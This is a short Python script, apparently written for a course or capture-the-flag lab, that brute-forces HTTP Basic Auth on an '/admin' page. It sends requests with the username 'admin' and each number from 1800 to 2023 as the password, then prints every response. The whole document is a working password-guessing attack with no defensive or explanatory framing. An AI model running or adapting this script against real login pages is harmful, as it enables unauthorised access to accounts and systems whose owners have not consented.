import requests
from requests.auth import HTTPBasicAuth

url = "https://ca6fb17c-3e4e-4c06-8332-14c432db729f-web.web.lms.itmo.xyz/admin"

payload = {}
username = 'admin'

for i in range(1800, 2024):
    password = i
    response = requests.get(url, auth=HTTPBasicAuth(username, password))
    print(i, response.text)
